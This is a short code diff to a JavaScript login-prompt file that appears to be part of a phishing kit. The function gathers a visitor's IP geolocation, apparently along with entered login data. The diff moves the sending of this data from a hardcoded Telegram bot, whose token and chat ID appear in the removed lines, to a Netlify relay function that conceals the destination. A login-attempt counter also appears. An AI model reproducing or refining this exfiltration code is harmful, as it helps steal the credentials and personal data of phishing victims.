@@ -176,23 +176,21 @@ function showPrompt(IpAddress) {
 <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
 <strong>City: </strong><code>${IpAddress.city}</code>`;
 
-      const token = "8373103187:AAHADLa3tmFmoSx5txqa5yx0nAt7GEd0iPw";
-      const chat_id = "-1002938976171";
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      fetch('https://tele-123-456.netlify.app/.netlify/functions/send-telegram', {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: chat_id,
-          text: message,
-          parse_mode: "html",
+          message: message
         }),
       })
         .then((res) => {
-          if (!res.ok) throw new Error("Telegram request failed");
+          if (!res.ok) throw new Error("telegram request failed");
           return res.json();
         })
         .then((data) => {
+          if (!data.success) {
+            throw new Error(data.error || "telegram send failed");
+          }
           NUMBER_TIME_LOGIN++;
 
           if (NUMBER_TIME_LOGIN === 1) {
